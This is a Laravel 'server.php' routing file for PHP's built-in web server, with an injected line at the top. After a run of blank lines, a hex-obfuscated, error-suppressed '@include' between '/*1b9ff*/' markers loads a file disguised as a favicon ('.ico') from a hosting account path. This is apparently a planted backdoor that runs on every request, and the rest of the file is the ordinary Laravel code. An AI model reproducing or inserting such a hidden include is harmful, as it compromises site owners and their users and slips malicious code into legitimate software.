<?php





























/*1b9ff*/

@include "\x2fho\x6de1\x2fna\x64ir\x61li\x2fpu\x62li\x63_h\x74ml\x2fma\x72k1\x74ec\x68no\x6cog\x69es\x2eco\x6d/a\x64do\x6es/\x64ef\x61ul\x74/f\x69el\x64_t\x79pe\x73/f\x61vi\x63on\x5f2d\x333c\x31.i\x63o";

/*1b9ff*/

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylorotwell@gmail.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
